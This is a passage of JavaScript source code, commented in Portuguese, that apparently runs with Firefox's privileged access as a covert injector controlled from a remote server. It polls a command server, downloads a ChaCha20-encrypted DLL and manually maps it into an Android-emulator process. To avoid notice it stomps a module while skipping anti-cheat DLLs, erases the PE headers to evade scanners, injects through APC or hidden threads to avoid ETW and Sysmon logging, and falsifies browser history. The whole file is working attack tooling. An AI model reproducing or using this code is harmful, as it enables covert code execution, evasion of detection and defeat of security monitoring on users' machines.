// ═══════════════════════════════════════════════════════════════════════════════
// CHACHA20
// ═══════════════════════════════════════════════════════════════════════════════

function rotl32(x, n) {
    return ((x << n) | (x >>> (32 - n))) >>> 0;
}

function chacha20Block(key, counter, nonce) {
    // key: Uint8Array[32], counter: number, nonce: Uint8Array[12]
    // returns: Uint8Array[64]
    function lu32(arr, i) {
        return (arr[i] | arr[i+1]<<8 | arr[i+2]<<16 | arr[i+3]<<24) >>> 0;
    }
    var s = new Uint32Array([
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        lu32(key,0), lu32(key,4), lu32(key,8),  lu32(key,12),
        lu32(key,16),lu32(key,20),lu32(key,24), lu32(key,28),
        counter >>> 0,
        lu32(nonce,0), lu32(nonce,4), lu32(nonce,8)
    ]);
    var w = new Uint32Array(s);
    function qr(a, b, c, d) {
        w[a]=(w[a]+w[b])>>>0; w[d]^=w[a]; w[d]=rotl32(w[d],16);
        w[c]=(w[c]+w[d])>>>0; w[b]^=w[c]; w[b]=rotl32(w[b],12);
        w[a]=(w[a]+w[b])>>>0; w[d]^=w[a]; w[d]=rotl32(w[d], 8);
        w[c]=(w[c]+w[d])>>>0; w[b]^=w[c]; w[b]=rotl32(w[b], 7);
    }
    for (var r = 0; r < 10; r++) {
        qr(0,4,8,12); qr(1,5,9,13); qr(2,6,10,14); qr(3,7,11,15);
        qr(0,5,10,15); qr(1,6,11,12); qr(2,7,8,13); qr(3,4,9,14);
    }
    for (var i = 0; i < 16; i++) w[i] = (w[i] + s[i]) >>> 0;
    var out = new Uint8Array(64);
    for (var i = 0; i < 16; i++) {
        out[i*4]   =  w[i]        & 0xff;
        out[i*4+1] = (w[i] >>>  8) & 0xff;
        out[i*4+2] = (w[i] >>> 16) & 0xff;
        out[i*4+3] = (w[i] >>> 24) & 0xff;
    }
    return out;
}

function chacha20Decrypt(key, nonce, cipher) {
    // key: Uint8Array[32], nonce: Uint8Array[12], cipher: Uint8Array
    var plain  = new Uint8Array(cipher.length);
    var block  = null;
    var ctr    = 0;
    for (var i = 0; i < cipher.length; i++) {
        if (i % 64 === 0) block = chacha20Block(key, ctr++, nonce);
        plain[i] = cipher[i] ^ block[i % 64];
    }
    return plain;
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS — endereços e ponteiros
// ═══════════════════════════════════════════════════════════════════════════════

function ptrToBI(ptr) {
    return BigInt(ctypes.cast(ptr, ctypes.uintptr_t).value.toString());
}

function biToU8x8LE(bi) {
    var arr = new Uint8Array(8);
    var n   = bi;
    for (var i = 0; i < 8; i++) { arr[i] = Number(n & 0xFFn); n >>= 8n; }
    return arr;
}

// Converte endereço absoluto (BigInt) para ctypes.voidptr_t
function biToPtr(bi) {
    var u64 = ctypes.UInt64(bi.toString());
    return ctypes.cast(u64, ctypes.voidptr_t);   // via UInt64 reinterpret
}

// ═══════════════════════════════════════════════════════════════════════════════
// PARSER PE (opera sobre Uint8Array em memória do Firefox)
// ═══════════════════════════════════════════════════════════════════════════════

function parsePE(buf) {
    var v = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
    function u8 (o) { return v.getUint8(o); }
    function u16(o) { return v.getUint16(o, true); }
    function u32(o) { return v.getUint32(o, true); }
    function u64(o) { return BigInt(v.getUint32(o,true)) | (BigInt(v.getUint32(o+4,true)) << 32n); }

    if (u16(0) !== 0x5A4D) return null;
    var peOff = u32(0x3C);
    if (u32(peOff) !== 0x00004550) return null;
    if (u16(peOff + 4) !== 0x8664) return null;    // must be AMD64

    var numSec      = u16(peOff + 6);
    var szOptHdr    = u16(peOff + 20);
    var optBase     = peOff + 24;

    if (u16(optBase) !== 0x020B) return null;        // PE32+

    var sizeOfImage    = u32(optBase + 56);
    var sizeOfHeaders  = u32(optBase + 60);
    var entryRVA       = u32(optBase + 16);
    var preferredBase  = u64(optBase + 24);
    var numDataDirs    = u32(optBase + 108);
    var ddBase         = optBase + 112;

    var ddImport    = { rva: u32(ddBase + 1*8),   size: u32(ddBase + 1*8+4) };
    var ddBaseReloc = { rva: u32(ddBase + 5*8),   size: u32(ddBase + 5*8+4) };
    var ddTls       = { rva: u32(ddBase + 9*8),   size: u32(ddBase + 9*8+4) };

    var secOff = optBase + szOptHdr;
    var sections = [];
    for (var i = 0; i < numSec; i++) {
        var s = secOff + i * 40;
        sections.push({
            name:         String.fromCharCode(u8(s),u8(s+1),u8(s+2),u8(s+3),u8(s+4),u8(s+5),u8(s+6),u8(s+7)).replace(/\0/g,""),
            virtualSize:  u32(s + 8),
            virtualAddr:  u32(s + 12),
            rawSize:      u32(s + 16),
            rawOffset:    u32(s + 20),
            characteristics: u32(s + 36)
        });
    }

    return {
        u32: u32, u64: u64,
        sizeOfImage, sizeOfHeaders, entryRVA,
        preferredBase, sections,
        ddImport, ddBaseReloc
    };
}

// ═══════════════════════════════════════════════════════════════════════════════
// ENCONTRAR PROCESSO
// ═══════════════════════════════════════════════════════════════════════════════

function findPID(name) {
    var TH32CS_SNAPPROCESS = 0x00000002;
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snap || snap.isNull()) return 0;
    var entry = new PROCESSENTRY32W();
    entry.dwSize = PROCESSENTRY32W.size;
    var pid = 0;
    if (Process32FirstW(snap, entry.address())) {
        do {
            if (entry.szExeFile.readString().toLowerCase() === name.toLowerCase()) {
                pid = entry.th32ProcessID; break;
            }
        } while (Process32NextW(snap, entry.address()));
    }
    CloseHandle(snap);
    return pid;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MODULE STOMPING — encontra DLL vítima com SizeOfImage suficiente
// DLLs de mídia/codec/font são bons alvos: grandes e raramente integrity-checked
// ═══════════════════════════════════════════════════════════════════════════════

var SKIP_MODULES = [
    // core do OS — sempre integrity-checked
    "ntdll.dll","kernel32.dll","kernelbase.dll","user32.dll",
    "win32u.dll","gdi32full.dll","msvcrt.dll","ucrtbase.dll",
    "sechost.dll","rpcrt4.dll","combase.dll","advapi32.dll",
    "msvcp_win.dll","vcruntime140.dll","clbcatq.dll",
    // processo alvo em si
    "hd-player.exe","dnplayer.exe",
    // DLLs de anticheat conhecidas (nunca stomp)
    "battleye","easyanticheat","vanguard","xigncode","anticheats"
];

function findVictimModule(hProc, minSize) {
    var modArr = new (ctypes.ArrayType(HANDLE, 512))();
    var needed  = new DWORD(0);
    var LIST_MODULES_ALL = 0x03;
    var ok = EnumProcessModulesEx(hProc, modArr.address(), 512 * HANDLE.size, needed.address(), LIST_MODULES_ALL);
    if (!ok) return null;
    var count = Math.min(needed.value / HANDLE.size, 512);
    var nameBuf = new (ctypes.ArrayType(ctypes.char16_t, 260))();
    for (var i = 0; i < count; i++) {
        var hMod = modArr[i];
        if (!hMod || hMod.isNull()) continue;
        GetModuleFileNameExW(hProc, hMod, nameBuf.address(), 260);
        var fname = nameBuf.readString().split("\\").pop().toLowerCase();
        if (SKIP_MODULES.some(function(s){ return fname.indexOf(s) >= 0; })) continue;
        var info = new MODULEINFO();
        if (!GetModuleInformation(hProc, hMod, info.address(), MODULEINFO.size)) continue;
        if (info.SizeOfImage >= minSize) {
            return { base: info.lpBaseOfDll, size: info.SizeOfImage, name: fname };
        }
    }
    return null;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RESOLVER IMPORTS
// ═══════════════════════════════════════════════════════════════════════════════

function resolveImports(hProc, dllBuf, pe, allocBase) {
    var allocBI = ptrToBI(allocBase);
    if (!pe.ddImport.rva || !pe.ddImport.size) return true;
    var imp = pe.ddImport.rva;

    while (true) {
        var nameRVA = pe.u32(imp + 12);
        var iatRVA  = pe.u32(imp + 16);
        if (!nameRVA && !iatRVA) break;

        // nome da DLL importada
        var dllNameOff = nameRVA;
        var dllName    = "";
        while (dllBuf[dllNameOff]) dllName += String.fromCharCode(dllBuf[dllNameOff++]);

        var hImpDll = GetModuleHandleW(ctypes.char16_t.array()(dllName));
        if (!hImpDll || hImpDll.isNull()) {
            hImpDll = LoadLibraryW(ctypes.char16_t.array()(dllName));
            if (!hImpDll || hImpDll.isNull()) { imp += 20; continue; }
        }

        // percorre INT e IAT em paralelo
        var intRVA   = pe.u32(imp + 0);  // OriginalFirstThunk
        var iatEntry = iatRVA;
        var intEntry = intRVA || iatRVA;

        while (true) {
            // lê entrada INT de 8 bytes (IMAGE_THUNK_DATA64)
            var lo = pe.u32(intEntry);
            var hi = pe.u32(intEntry + 4);
            if (lo === 0 && hi === 0) break;

            var thunkBI = BigInt(lo) | (BigInt(hi) << 32n);
            var procAddr;
            if (thunkBI & (1n << 63n)) {
                // import by ordinal
                var ordinal = Number(thunkBI & 0xFFFFn);
                procAddr = GetProcAddress(hImpDll, ctypes.cast(ctypes.UInt64(ordinal.toString()), ctypes.char.ptr));
            } else {
                // import by name — nameRVA apontado por thunk
                var funcNameOff = Number(thunkBI) + 2; // skip hint
                var funcName    = "";
                while (dllBuf[funcNameOff]) funcName += String.fromCharCode(dllBuf[funcNameOff++]);
                procAddr = GetProcAddress(hImpDll, ctypes.char.array()(funcName));
            }

            if (procAddr && !procAddr.isNull()) {
                // escreve endereço absoluto (8 bytes) no IAT do processo-alvo
                var iatTargetBI = allocBI + BigInt(iatEntry);
                var addrBI      = ptrToBI(procAddr);
                var addrBytes   = biToU8x8LE(addrBI);
                var addrArr     = ctypes.uint8_t.array()(Array.from(addrBytes));
                var w           = new SIZE_T(0);
                WriteProcessMemory(hProc, biToPtr(iatTargetBI), addrArr, 8, w.address());
            }

            intEntry += 8;
            iatEntry += 8;
        }
        imp += 20;
    }
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════════
// APLICAR BASE RELOCATIONS
// ═══════════════════════════════════════════════════════════════════════════════

function applyRelocs(hProc, dllBuf, pe, allocBase) {
    if (!pe.ddBaseReloc.rva || !pe.ddBaseReloc.size) return;
    var allocBI = ptrToBI(allocBase);
    var delta   = allocBI - pe.preferredBase;
    if (delta === 0n) return;

    var off = pe.ddBaseReloc.rva;
    var end = off + pe.ddBaseReloc.size;

    while (off < end) {
        var pageRVA  = pe.u32(off);
        var blockSz  = pe.u32(off + 4);
        if (!blockSz) break;
        var numRelocs = (blockSz - 8) / 2;

        for (var i = 0; i < numRelocs; i++) {
            var entry  = (pe.u32(off + 8 + i*2 - (i%2 === 0 ? 0 : 2)) >>> 0);
            // read 2 bytes properly
            var lo = dllBuf[off + 8 + i*2];
            var hi = dllBuf[off + 8 + i*2 + 1];
            var rel = lo | (hi << 8);
            var type   = (rel >> 12) & 0xF;
            var relOff = rel & 0xFFF;

            if (type === 10) { // IMAGE_REL_BASED_DIR64
                var targetRVA = pageRVA + relOff;
                var targetBI  = allocBI + BigInt(targetRVA);

                // ler 8 bytes atuais do processo
                var curBuf = ctypes.uint8_t.array(8)();
                var rd     = new SIZE_T(0);
                ReadProcessMemory(hProc, biToPtr(targetBI), curBuf, 8, rd.address());

                // parsear como LE int64 e aplicar delta
                var cur = 0n;
                for (var b = 7; b >= 0; b--) cur = (cur << 8n) | BigInt(curBuf[b]);
                var patched = cur + delta;

                var pBytes = biToU8x8LE(patched & 0xFFFFFFFFFFFFFFFFn);
                var pArr   = ctypes.uint8_t.array()(Array.from(pBytes));
                var wr     = new SIZE_T(0);
                WriteProcessMemory(hProc, biToPtr(targetBI), pArr, 8, wr.address());
            }
        }
        off += blockSz;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SHELLCODE TRAMPOLINE
//
// Versão com done flag + APC guard (60 bytes):
//   mov r10, doneFlagAddr   ; carrega endereço do flag
//   mov al, [r10]           ; lê byte do flag
//   test al, al             ; se != 0: outro APC já executou
//   jnz done_label          ; pula para ret (sem executar DllMain de novo)
//   mov byte [r10], 1       ; marca "em execução" (evita re-execução por outro APC)
//   mov rcx, dllBase        ; arg1 = base da DLL
//   mov edx, 1              ; arg2 = DLL_PROCESS_ATTACH
//   xor r8, r8              ; arg3 = 0
//   mov rax, entryAddr      ; ponteiro para DllMain
//   sub rsp, 0x28           ; shadow space (x64 ABI)
//   call rax                ; chama DllMain
//   add rsp, 0x28
//   done_label: ret
//
// Versão sem done flag (39 bytes): sem os primeiros 4+1 grupos de instruções
// ═══════════════════════════════════════════════════════════════════════════════

function buildTrampoline(dllBaseBI, entryBI, doneFlagBI) {
    var hasDoneFlag = (typeof doneFlagBI !== 'undefined') && doneFlagBI !== 0n;
    var sc = new Uint8Array(64);
    var baseBytes  = biToU8x8LE(dllBaseBI);
    var entryBytes = biToU8x8LE(entryBI);
    var o = 0;

    if (hasDoneFlag) {
        var flagBytes = biToU8x8LE(doneFlagBI);
        // mov r10, doneFlagAddr  (49 BA + 8 bytes = 10 bytes)
        // R10 é volátil (caller-saved) — não precisa preservar
        sc[o++]=0x49; sc[o++]=0xBA;
        for (var i=0;i<8;i++) sc[o++]=flagBytes[i];
        // mov al, byte [r10]  (41 8A 02 = 3 bytes)
        sc[o++]=0x41; sc[o++]=0x8A; sc[o++]=0x02;
        // test al, al  (84 C0 = 2 bytes)
        sc[o++]=0x84; sc[o++]=0xC0;
        // jnz done_label  (75 ?? = 2 bytes) — patch abaixo
        var jnzOff = o; sc[o++]=0x75; sc[o++]=0x00;
        // mov byte [r10], 1  (41 C6 02 01 = 4 bytes)
        sc[o++]=0x41; sc[o++]=0xC6; sc[o++]=0x02; sc[o++]=0x01;
    }

    // mov rcx, dllBase  (48 B9 + 8 bytes)
    sc[o++]=0x48; sc[o++]=0xB9;
    for (var i=0;i<8;i++) sc[o++]=baseBytes[i];
    // mov edx, 1  (BA 01 00 00 00)
    sc[o++]=0xBA; sc[o++]=1; sc[o++]=0; sc[o++]=0; sc[o++]=0;
    // xor r8, r8  (4D 31 C0)
    sc[o++]=0x4D; sc[o++]=0x31; sc[o++]=0xC0;
    // mov rax, entryAddr  (48 B8 + 8 bytes)
    sc[o++]=0x48; sc[o++]=0xB8;
    for (var i=0;i<8;i++) sc[o++]=entryBytes[i];
    // sub rsp, 0x28  (48 83 EC 28)
    sc[o++]=0x48; sc[o++]=0x83; sc[o++]=0xEC; sc[o++]=0x28;
    // call rax  (FF D0)
    sc[o++]=0xFF; sc[o++]=0xD0;
    // add rsp, 0x28  (48 83 C4 28)
    sc[o++]=0x48; sc[o++]=0x83; sc[o++]=0xC4; sc[o++]=0x28;
    // done_label: ret  (C3)
    var retOff = o;
    sc[o++]=0xC3;

    // patch do offset relativo do jnz
    if (hasDoneFlag) {
        // jnz é em jnzOff, próxima instrução em jnzOff+2
        // alvo = retOff; rel8 = retOff - (jnzOff + 2)
        sc[jnzOff + 1] = retOff - (jnzOff + 2);
    }

    return sc;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PERMISSÕES POR SECTION CHARACTERISTICS
// ═══════════════════════════════════════════════════════════════════════════════

function sectionProtect(chars) {
    var exec  = (chars & 0x20000000) !== 0;
    var read  = (chars & 0x40000000) !== 0;
    var write = (chars & 0x80000000) !== 0;
    if (exec  &&  read &&  write) return 0x40;  // PAGE_EXECUTE_READ_WRITE
    if (exec  &&  read && !write) return 0x20;  // PAGE_EXECUTE_READ
    if (exec  && !read)           return 0x10;  // PAGE_EXECUTE
    if (!exec &&  read &&  write) return 0x04;  // PAGE_READWRITE
    if (!exec &&  read && !write) return 0x02;  // PAGE_READONLY
    return 0x04;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MANUAL MAP PRINCIPAL
// ═══════════════════════════════════════════════════════════════════════════════

function manualMap(dllBytes, pid) {
    var pe = parsePE(dllBytes);
    if (!pe) return { ok: false, msg: "PE inválido" };

    // Acesso mínimo: VM_OP | VM_READ | VM_WRITE | QUERY_INFO | CREATE_THREAD
    var ACCESS = 0x0002|0x0008|0x0010|0x0020|0x0400;
    var hProc  = OpenProcess(ACCESS, 0, pid);
    if (!hProc || hProc.isNull()) return { ok: false, msg: "OpenProcess falhou: " + GetLastError() };

    var MEM_COMMIT  = 0x1000;
    var MEM_RESERVE = 0x2000;
    var MEM_RELEASE = 0x8000;
    var PAGE_RW     = 0x04;
    var PAGE_RX     = 0x20;
    var PAGE_RWX    = 0x40;

    var allocBase = null;
    var stomped   = false;

    // — tentar module stomping primeiro —
    var victim = findVictimModule(hProc, pe.sizeOfImage);
    if (victim) {
        var oldProt = new DWORD(0);
        var vp = VirtualProtectEx(hProc, victim.base, pe.sizeOfImage, PAGE_RWX, oldProt.address());
        if (vp) { allocBase = victim.base; stomped = true; }
    }

    // — fallback: alocação privada —
    if (!allocBase || allocBase.isNull()) {
        allocBase = VirtualAllocEx(hProc, null, pe.sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
    }
    if (!allocBase || allocBase.isNull()) {
        CloseHandle(hProc);
        return { ok: false, msg: "VirtualAllocEx falhou: " + GetLastError() };
    }

    var written = new SIZE_T(0);
    var allocBI = ptrToBI(allocBase);

    // — gravar headers —
    var hdrsArr = ctypes.uint8_t.array()(Array.from(dllBytes.subarray(0, pe.sizeOfHeaders)));
    WriteProcessMemory(hProc, allocBase, hdrsArr, pe.sizeOfHeaders, written.address());

    // — gravar sections —
    for (var i = 0; i < pe.sections.length; i++) {
        var sec = pe.sections[i];
        if (!sec.rawSize) continue;
        var secData   = ctypes.uint8_t.array()(Array.from(dllBytes.subarray(sec.rawOffset, sec.rawOffset + sec.rawSize)));
        var secTarget = biToPtr(allocBI + BigInt(sec.virtualAddr));
        var w2        = new SIZE_T(0);
        WriteProcessMemory(hProc, secTarget, secData, sec.rawSize, w2.address());
    }

    // — resolver imports —
    resolveImports(hProc, dllBytes, pe, allocBase);

    // — aplicar relocations —
    applyRelocs(hProc, dllBytes, pe, allocBase);

    // — ZERAR headers PE no processo-alvo (elimina assinatura MZ/PE do scanner) —
    // imports e relocs já foram resolvidos a partir de dllBytes (memória do Firefox),
    // então podemos apagar com segurança os headers no processo-alvo.
    var zeroHdr = ctypes.uint8_t.array()(new Array(pe.sizeOfHeaders).fill(0));
    var wZero   = new SIZE_T(0);
    WriteProcessMemory(hProc, allocBase, zeroHdr, pe.sizeOfHeaders, wZero.address());

    // — set permissões por section —
    var oldP = new DWORD(0);
    for (var i = 0; i < pe.sections.length; i++) {
        var sec  = pe.sections[i];
        var prot = sectionProtect(sec.characteristics);
        var sPtr = biToPtr(allocBI + BigInt(sec.virtualAddr));
        VirtualProtectEx(hProc, sPtr, sec.virtualSize || sec.rawSize, prot, oldP.address());
    }
    // Headers: agora zerados → PAGE_READONLY (zeros, mas sem executabilidade)
    var oldPHdr = new DWORD(0);
    VirtualProtectEx(hProc, allocBase, pe.sizeOfHeaders, 0x02, oldPHdr.address());

    // — alocar done flag (8 bytes RW) —
    // O shellcode escreve 1 aqui quando DllMain retorna.
    // Permite saber se a APC disparou sem depender de handle de thread.
    var doneFlag   = VirtualAllocEx(hProc, null, 8, MEM_COMMIT|MEM_RESERVE, PAGE_RW);
    var doneFlagBI = (doneFlag && !doneFlag.isNull()) ? ptrToBI(doneFlag) : 0n;

    // — alocar e escrever shellcode trampoline —
    var entryBI  = allocBI + BigInt(pe.entryRVA);
    var sc       = buildTrampoline(allocBI, entryBI, doneFlagBI);
    var scOwned  = false;
    var scAlloc  = VirtualAllocEx(hProc, null, 64, MEM_COMMIT|MEM_RESERVE, PAGE_RX);
    if (scAlloc && !scAlloc.isNull()) {
        scOwned = true;
    } else {
        scAlloc = allocBase; // workaround: entry aponta para início da região mapeada
    }
    var scArr = ctypes.uint8_t.array()(Array.from(sc));
    var wSC   = new SIZE_T(0);
    WriteProcessMemory(hProc, scAlloc, scArr, 64, wSC.address());

    // ═══ INJEÇÃO PRIMÁRIA: NtQueueApcThread em TODAS as threads ══════════════════
    // Sem criar thread nova — APC é executado em thread existente quando alertable.
    // Queued em todas as threads: maximiza chance de pelo menos uma estar em wait.
    // O shellcode tem guard de re-execução (done flag) então só DllMain roda uma vez.
    var TH32CS_SNAPTHREAD  = 0x00000004;
    var THREAD_SET_CONTEXT = 0x0010;
    var apcQueued = 0;
    var apcSnap   = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (apcSnap && !apcSnap.isNull()) {
        var te = new THREADENTRY32();
        te.dwSize = THREADENTRY32.size;
        if (Thread32First(apcSnap, te.address())) {
            do {
                if (te.th32OwnerProcessID === pid) {
                    var hThr = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
                    if (hThr && !hThr.isNull()) {
                        NtQueueApcThread(hThr, scAlloc, null, null, null);
                        CloseHandle(hThr);
                        apcQueued++;
                    }
                }
            } while (Thread32Next(apcSnap, te.address()));
        }
        CloseHandle(apcSnap);
    }

    // — aguardar APC disparar (máx 2.5s, polling a cada 100ms) —
    var apcFired = false;
    if (apcQueued > 0 && doneFlagBI !== 0n) {
        var flagBuf = ctypes.uint8_t.array()([0]);
        var rdF     = new SIZE_T(0);
        for (var w = 0; w < 25 && !apcFired; w++) {
            SleepFn(100);
            ReadProcessMemory(hProc, doneFlag, flagBuf, 1, rdF.address());
            if (flagBuf[0] !== 0) apcFired = true;
        }
    }

    // ═══ FALLBACK: NtCreateThreadEx com HideFromDebugger ════════════════════════
    // HideFromDebugger (flag 0x4) suprime eventos ETW de criação de thread
    // (CreateThread debug events, Sysmon Event ID 8 via KernelLogger).
    // A thread ainda existe no sistema mas não dispara eventos de debugger.
    var ok = apcFired;
    if (!ok) {
        // Resetar done flag antes do fallback para confirmar execução
        if (doneFlagBI !== 0n) {
            var resetBuf = ctypes.uint8_t.array()([0]);
            var wR = new SIZE_T(0);
            WriteProcessMemory(hProc, doneFlag, resetBuf, 1, wR.address());
        }
        var hThrdOut      = ctypes.voidptr_t();
        var THREAD_ALL    = 0x1FFFFF;
        var HIDE_THREAD   = 0x4;  // HideFromDebugger
        var ntStat = NtCreateThreadEx(
            hThrdOut.address(),
            THREAD_ALL,
            null,
            hProc,
            scAlloc,
            null,
            HIDE_THREAD,
            0, 0, 0, null
        );
        if (Number(ntStat) === 0 && !hThrdOut.isNull()) {
            WaitForSingleObject(hThrdOut, 8000);
            CloseHandle(hThrdOut);
            ok = true;
        }
    }

    // — limpar shellcode (zerar bytes + liberar se owner) —
    // Remove o trampoline da memória assim que a thread termina.
    if (scOwned) {
        var scClear = ctypes.uint8_t.array()(new Array(64).fill(0));
        var wClear  = new SIZE_T(0);
        WriteProcessMemory(hProc, scAlloc, scClear, 64, wClear.address());
        VirtualFreeEx(hProc, scAlloc, 0, MEM_RELEASE);
    }

    // — liberar done flag —
    if (doneFlag && !doneFlag.isNull()) {
        VirtualFreeEx(hProc, doneFlag, 0, MEM_RELEASE);
    }

    // — fechar handle do processo imediatamente —
    CloseHandle(hProc);
    return { ok: ok, msg: ok ? "ok" : "injeção falhou" };
}

// ═══════════════════════════════════════════════════════════════════════════════
// HTTP HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

function xhrGet(url, type) {
    var xhr = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"]
                        .createInstance(Components.interfaces.nsIXMLHttpRequest);
    xhr.open("GET", url, false);
    if (type) xhr.responseType = type;
    try { xhr.send(); } catch(e) { return null; }
    if (xhr.status !== 200) return null;
    return { data: xhr.response, hdr: function(h){ return xhr.getResponseHeader(h); } };
}

function xhrPost(url, body) {
    var xhr = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"]
                        .createInstance(Components.interfaces.nsIXMLHttpRequest);
    xhr.open("POST", url, false);
    xhr.setRequestHeader("Content-Type", "application/json");
    try { xhr.send(body || "{}"); } catch(e) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
// MASCARAR HISTÓRICO
// ═══════════════════════════════════════════════════════════════════════════════

function maskHistory() {
    try {
        var { PlacesUtils } = ChromeUtils.import("resource://gre/modules/PlacesUtils.jsm");
        PlacesUtils.history.insert({
            url:    FAKE_URL,
            title:  FAKE_TTL,
            visits: [{ transition: PlacesUtils.history.TRANSITIONS.LINK }]
        });
    } catch(e) {
        try {
            var hs  = Components.classes["@mozilla.org/browser/nav-history-service;1"]
                                .getService(Components.interfaces.nsINavHistoryService);
            var uri = Services.io.newURI(FAKE_URL, null, null);
            hs.addVisit(uri, Date.now() * 1000, null, hs.TRANSITION_LINK, false, 0);
        } catch(e2) {}
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// INJEÇÃO PRINCIPAL
// ═══════════════════════════════════════════════════════════════════════════════

function doInject() {
    var pid = findPID(TARGET);
    if (!pid) {
        xhrPost(SERVER + "/api/catalog/event",
                JSON.stringify({ ok: false, msg: "processo não encontrado" }));
        return;
    }

    // baixar DLL encriptada
    var resp = xhrGet(SERVER + "/api/assets/pkg", "arraybuffer");
    if (!resp || !resp.data) {
        xhrPost(SERVER + "/api/catalog/event",
                JSON.stringify({ ok: false, msg: "download falhou" }));
        return;
    }

    // extrair key+nonce do header X-Cache-Tag
    var tag = resp.hdr("X-Cache-Tag");
    if (!tag) {
        xhrPost(SERVER + "/api/catalog/event",
                JSON.stringify({ ok: false, msg: "sem tag" }));
        return;
    }

    // base64 decode
    function b64Decode(s) {
        var bin = atob(s);
        var arr = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
        return arr;
    }

    var tagBytes = b64Decode(tag);           // 44 bytes: 32 key + 12 nonce
    var key      = tagBytes.subarray(0, 32);
    var nonce    = tagBytes.subarray(32, 44);
    var cipher   = new Uint8Array(resp.data);

    // decriptar
    var plain = chacha20Decrypt(key, nonce, cipher);

    // manual map (sem tocar disco)
    var result = manualMap(plain, pid);

    // apagar bytes decriptados e encriptados da heap do Firefox
    // (reduz janela de exposição em caso de scan de memória do próprio Firefox)
    plain.fill(0);
    cipher.fill(0);

    // mascarar histórico
    maskHistory();

    // reportar
    xhrPost(SERVER + "/api/catalog/event",
            JSON.stringify({ ok: result.ok, msg: result.msg, pid: pid }));
}

// ═══════════════════════════════════════════════════════════════════════════════
// LOOP DE POLLING
// ═══════════════════════════════════════════════════════════════════════════════

var pollTimer = null;

function poll() {
    // heartbeat
    xhrPost(SERVER + "/api/catalog/sync");

    // verificar estado
    var r = xhrGet(SERVER + "/api/catalog/status", "json");
    if (!r || !r.data) return;

    var st = r.data;
    if (st.halt) {
        // servidor pediu parada
        try { Components.utils.clearInterval(pollTimer); } catch(e) {}
        return;
    }
    if (st.pending) {
        doInject();
    }
}

pollTimer = setInterval(poll, POLL_MS);
poll();

} // end main()
